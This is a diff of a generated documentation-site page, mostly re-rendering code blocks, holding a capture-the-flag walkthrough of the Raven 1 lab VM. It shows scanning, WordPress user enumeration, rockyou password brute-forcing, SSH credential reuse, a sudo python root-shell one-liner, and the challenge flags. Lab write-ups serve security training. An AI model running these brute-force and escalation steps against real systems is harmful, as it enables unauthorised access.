@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17362,37 +17385,38 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <li>eth0 interface.</li>
 </ul>
 <p>After running </p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>ip<span class="w"> </span>a
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>ip<span class="w"> </span>a
+</span></code></pre></div></td></tr></table></div>
 <h3 id="reconnaissance">Reconnaissance</h3>
 <h4 id="identify-victims-ip">Identify victim's IP</h4>
 <p>we know that the attacker's machine IP address is 192.168.56.102/24. To discover the victim's machine IP, we run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>netdiscover<span class="w"> </span>-i<span class="w"> </span>eth1<span class="w"> </span>-r<span class="w"> </span><span class="m">192</span>.168.56.102/24
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>sudo<span class="w"> </span>netdiscover<span class="w"> </span>-i<span class="w"> </span>eth1<span class="w"> </span>-r<span class="w"> </span><span class="m">192</span>.168.56.102/24
+</span></code></pre></div></td></tr></table></div>
 <p>These are the  results:</p>
 <p><img alt="Victim's machine IP" src="../img/raven1-1.png" /></p>
 <h4 id="scan-victims-surface-attack">Scan victim's surface attack</h4>
 <p>Now we can run a scanner to see which services are running on the victim's machine:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-p-<span class="w"> </span>-A<span class="w"> </span><span class="m">192</span>.168.56.104
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-p-<span class="w"> </span>-A<span class="w"> </span><span class="m">192</span>.168.56.104
+</span></code></pre></div></td></tr></table></div>
 <p>And the results:</p>
 <p><img alt="Victim's machine ports" src="../img/raven1-2.png" /></p>
 <p>Having a web server in port 80, it's inevitable to open a browser and have a look at it. Also, at the same time, we can run a simple enumeration scan:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>dirb<span class="w"> </span>http://192.168.56.104
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>dirb<span class="w"> </span>http://192.168.56.104
+</span></code></pre></div></td></tr></table></div>
 <p>The results are pretty straightforward:</p>
 <p><img alt="Victim's machine ports" src="../img/raven1-3.png" /></p>
 <p>There is a wordpress installation (maybe not well accomplished) running on the server. Also there are some services installed such as PHPMailer. </p>
 <p>By reviewing the source code in the pages we find the first flag:</p>
 <p><img alt="flag1.txt" src="../img/raven1-0.png" /></p>
 <p>Here, flag1 in plain text:</p>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="cm">&lt;!-- End footer Area --&gt;</span>        
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>            <span class="cm">&lt;!-- flag1{b9bbcb33e11b80be759c4e844862482d} --&gt;</span>
-</span></code></pre></div>
+<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="cm">&lt;!-- End footer Area --&gt;</span>        
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>            <span class="cm">&lt;!-- flag1{b9bbcb33e11b80be759c4e844862482d} --&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <h4 id="deeper-scan-with-specific-tool-for-wordpress-service-wpsca">Deeper scan with specific tool for wordpress service: wpsca</h4>
 <p>First, let's start by running a much deeper scanner with <a href="../wpscan/">wpscan</a>. We'll be enumerating users, </p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://192.168.56.104/wordpress<span class="w"> </span>--enumerate<span class="w"> </span>u<span class="w"> </span>--force<span class="w"> </span>--wp-content-dir<span class="w"> </span>wp-content
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://192.168.56.104/wordpress<span class="w"> </span>--enumerate<span class="w"> </span>u<span class="w"> </span>--force<span class="w"> </span>--wp-content-dir<span class="w"> </span>wp-content
+</span></code></pre></div></td></tr></table></div>
 <p>And the results show us some interesting findings:</p>
 <p><img alt="Wpscan results" src="../img/raven1-5.png" /></p>
 <p>First, one thing that later may be useful: XML-RPC seems to be enabled: http://192.168.56.104/wordpress/xmlrpc.php. What does this service do? It allows authentication to post entries. It's also useful in wordpress for retrieving pings when a post is linked back. This means that it's also an open door for exploitation. We'll return to this later.</p>
@@ -17401,12 +17425,13 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>As a matter of fact, by clicking on http://192.168.56.104/wp-admin/install.php, we end up on a webpage like this:</p>
 <p><img alt="Installation already done, but url need redirection in your hosts file" src="../img/raven1-4.png" /></p>
 <p>Nice, so, the link button is giving us a tip, we need to include a redirection in our /etc/hosts file. </p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>sudo<span class="w"> </span>nano<span class="w"> </span>/etc/hosts
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>sudo<span class="w"> </span>nano<span class="w"> </span>/etc/hosts
+</span></code></pre></div></td></tr></table></div>
 <p>At the  end of the file we add the following line:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="m">192</span>.168.56.104<span class="w">  </span>local.raven
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="c1"># CTRL-s  and CTRL-x</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="m">192</span>.168.56.104<span class="w">  </span>local.raven
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="c1"># CTRL-s  and CTRL-x</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Now we can browse perfectly the wordpress site. Also, finishing our wpscan, there are two more interesting findings:</p>
 <p><img alt="wpscan - second part" src="../img/raven1-7.png" /></p>
 <p>These findings are:</p>
@@ -17435,8 +17460,8 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h3 id="exploiting-findings">Exploiting findings</h3>
 <h4 id="bruce-forcing-passwords-for-the-cms">Bruce-forcing passwords for the CMS</h4>
 <p>Having found anything, after testing input validations in the endpoints of the application, I'm going to try to brute force login with steven, who is the user with id=2.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://192.168.56.104/wordpress<span class="w"> </span>--passwords<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w">  </span>--usernames<span class="w"> </span>steven<span class="w"> </span>-t<span class="w"> </span><span class="m">25</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://192.168.56.104/wordpress<span class="w"> </span>--passwords<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w">  </span>--usernames<span class="w"> </span>steven<span class="w"> </span>-t<span class="w"> </span><span class="m">25</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Resulst:</p>
 <p><img alt="Brute forcing user steven" src="../img/raven1-9.png" /></p>
 <p>Now, we have:</p>
@@ -17447,12 +17472,12 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>These credentials are good to login into the wordpress and... retrieve flag3!!!</p>
 <p><img alt="flag3" src="../img/raven1-14.png" /></p>
 <p>Flag3 was hidden in the draft of a post. Here, in plain text:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>flag3{afc01ab56b50591e7dccf93122770cd2}
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>flag3{afc01ab56b50591e7dccf93122770cd2}
+</span></code></pre></div></td></tr></table></div>
 <h4 id="using-credentials-found-for-wordpress-in-a-different-service-ssh">Using credentials found for wordpress in a different service (ssh)</h4>
 <p>It's not uncommon to use same usernames and passwords across services. Wo, having found steven's password for wordpress, we may try to use the same credentials in a different service. Therefore, we will try to access port 22 (which was open) and see if these creds are valid:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>ssh<span class="w"> </span>steven@192.168.56.104
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>ssh<span class="w"> </span>steven@192.168.56.104
+</span></code></pre></div></td></tr></table></div>
 <p>After confirming "fingerprinting", we are asked to introduce steven's password, and... it works!</p>
 <p><img alt="Getting access to the server with steven's credentials" src="../img/raven1-10.png" /></p>
 <h3 id="escalation-of-privileges">Escalation of privileges</h3>
@@ -17461,63 +17486,93 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p><strong>Resources</strong>: This site is a must when it comes to Unix binaries that can be used to bypass local security restrictions <a href="https://gtfobins.github.io/">https://gtfobins.github.io</a></p>
 <p>In particular, we can easily spot this valid exploit: <a href="https://gtfobins.github.io/gtfobins/python/#sudo">https://gtfobins.github.io/gtfobins/python/#sudo</a>. <strong>What does it say about python?</strong> If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</p>
 <p>This is just perfect. So to escalate to root we just need to run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>sudo<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os; os.system(&quot;/bin/sh&quot;)&#39;</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>sudo<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os; os.system(&quot;/bin/sh&quot;)&#39;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>See the results:</p>
 <p><img alt="Escalation of privileges" src="../img/raven1-12.png" /></p>
 <h3 id="getting-the-flags">Getting the flags</h3>
 <p>Printing flags now is not difficult at all:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>find<span class="w"> </span>.<span class="w"> </span>-name<span class="w"> </span>flag*.txt<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>find<span class="w"> </span>.<span class="w"> </span>-name<span class="w"> </span>flag*.txt<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
 <p>And results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>./var/www/flag2.txt
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>./root/flag4.txt
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span>
+<span class="normal"><a href="#__codelineno-13-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a>./var/www/flag2.txt
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2"></a>./root/flag4.txt
+</span></code></pre></div></td></tr></table></div>
 <p>We can print them now:</p>
-<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>cat<span class="w"> </span>/var/www/flag2.txt
-</span></code></pre></div>
+<p><div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a>cat<span class="w"> </span>/var/www/flag2.txt
+</span></code></pre></div></td></tr></table></div>
 Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
-</span></code></pre></div>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>cat<span class="w"> </span>/root/flag4.txt
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
+</span></code></pre></div></td></tr></table></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a>cat<span class="w"> </span>/root/flag4.txt
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>______                      
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>
-</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>| ___ \                     
-</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
-</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>| |_/ /__ ___   _____ _ __  
-</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>
-</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>|    // _` \ \ / / _ \ &#39;_ \ 
-</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>
-</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>| |\ \ (_| |\ V /  __/ | | |
-</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>
-</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>\_| \_\__,_| \_/ \___|_| |_|
-</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>
-</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>
-</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>flag4{715dea6c055b9fe3337544932f2941ce}
-</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>
-</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>CONGRATULATIONS on successfully rooting Raven!
-</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>
-</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>This is my first Boot2Root VM - I hope you enjoyed it.
-</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>
-</span><span id="__span-17-20"><a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a>Hit me up on Twitter and let me know what you thought: 
-</span><span id="__span-17-21"><a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a>
-</span><span id="__span-17-22"><a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a>@mccannwj / wjmccann.github.io
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-17-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-17-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-17-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-17-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-17-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-17-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-17-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-17-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-17-10">10</a></span>
+<span class="normal"><a href="#__codelineno-17-11">11</a></span>
+<span class="normal"><a href="#__codelineno-17-12">12</a></span>
+<span class="normal"><a href="#__codelineno-17-13">13</a></span>
+<span class="normal"><a href="#__codelineno-17-14">14</a></span>
+<span class="normal"><a href="#__codelineno-17-15">15</a></span>
+<span class="normal"><a href="#__codelineno-17-16">16</a></span>
+<span class="normal"><a href="#__codelineno-17-17">17</a></span>
+<span class="normal"><a href="#__codelineno-17-18">18</a></span>
+<span class="normal"><a href="#__codelineno-17-19">19</a></span>
+<span class="normal"><a href="#__codelineno-17-20">20</a></span>
+<span class="normal"><a href="#__codelineno-17-21">21</a></span>
+<span class="normal"><a href="#__codelineno-17-22">22</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a>______                      
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3"></a>| ___ \                     
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4"></a>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5"></a>| |_/ /__ ___   _____ _ __  
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6"></a>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7"></a>|    // _` \ \ / / _ \ &#39;_ \ 
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8"></a>
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9"></a>| |\ \ (_| |\ V /  __/ | | |
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10"></a>
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11"></a>\_| \_\__,_| \_/ \___|_| |_|
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12"></a>
+</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13"></a>
+</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14"></a>flag4{715dea6c055b9fe3337544932f2941ce}
+</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15"></a>
+</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16"></a>CONGRATULATIONS on successfully rooting Raven!
+</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17"></a>
+</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18"></a>This is my first Boot2Root VM - I hope you enjoyed it.
+</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19"></a>
+</span><span id="__span-17-20"><a id="__codelineno-17-20" name="__codelineno-17-20"></a>Hit me up on Twitter and let me know what you thought: 
+</span><span id="__span-17-21"><a id="__codelineno-17-21" name="__codelineno-17-21"></a>
+</span><span id="__span-17-22"><a id="__codelineno-17-22" name="__codelineno-17-22"></a>@mccannwj / wjmccann.github.io
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="Flags!" src="../img/raven1-13.png" /></p>
 <h3 id="commands-and-tools">Commands and tools</h3>
 <h4 id="commands-used-to-exploit-the-machine">Commands used to exploit the machine</h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>sudo netdiscover -i eth1 -r 192.168.56.102/24
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>sudo nmap -p- -A 192.168.56.104
-</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>dirb http://192.168.56.104
-</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>wpscan --url http://192.168.56.104/wordpress --enumerate u --force --wp-content-dir wp-content
-</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>echo &quot;192.168.56.104    local.raven&quot; sudo &gt;&gt; /etc/hosts
-</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>wpscan --url http://192.168.56.104/wordpress --passwords /usr/share/wordlists/rockyou.txt  --user steven -t 25
-</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>ssh steven@192.168.56.104
-</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>sudo python -c &#39;import os; os.system(&quot;/bin/sh&quot;)&#39;
-</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>find . -name flag*.txt 2&gt;/dev/null
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span>
+<span class="normal"><a href="#__codelineno-18-2">2</a></span>
+<span class="normal"><a href="#__codelineno-18-3">3</a></span>
+<span class="normal"><a href="#__codelineno-18-4">4</a></span>
+<span class="normal"><a href="#__codelineno-18-5">5</a></span>
+<span class="normal"><a href="#__codelineno-18-6">6</a></span>
+<span class="normal"><a href="#__codelineno-18-7">7</a></span>
+<span class="normal"><a href="#__codelineno-18-8">8</a></span>
+<span class="normal"><a href="#__codelineno-18-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a>sudo netdiscover -i eth1 -r 192.168.56.102/24
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2"></a>sudo nmap -p- -A 192.168.56.104
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3"></a>dirb http://192.168.56.104
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4"></a>wpscan --url http://192.168.56.104/wordpress --enumerate u --force --wp-content-dir wp-content
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5"></a>echo &quot;192.168.56.104    local.raven&quot; sudo &gt;&gt; /etc/hosts
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6"></a>wpscan --url http://192.168.56.104/wordpress --passwords /usr/share/wordlists/rockyou.txt  --user steven -t 25
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7"></a>ssh steven@192.168.56.104
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8"></a>sudo python -c &#39;import os; os.system(&quot;/bin/sh&quot;)&#39;
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9"></a>find . -name flag*.txt 2&gt;/dev/null
+</span></code></pre></div></td></tr></table></div>
 <h4 id="tools">Tools</h4>
 <ul>
 <li><a href="../dirb/">dirb</a>.</li>
@@ -17600,7 +17655,7 @@ Results:</p>
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
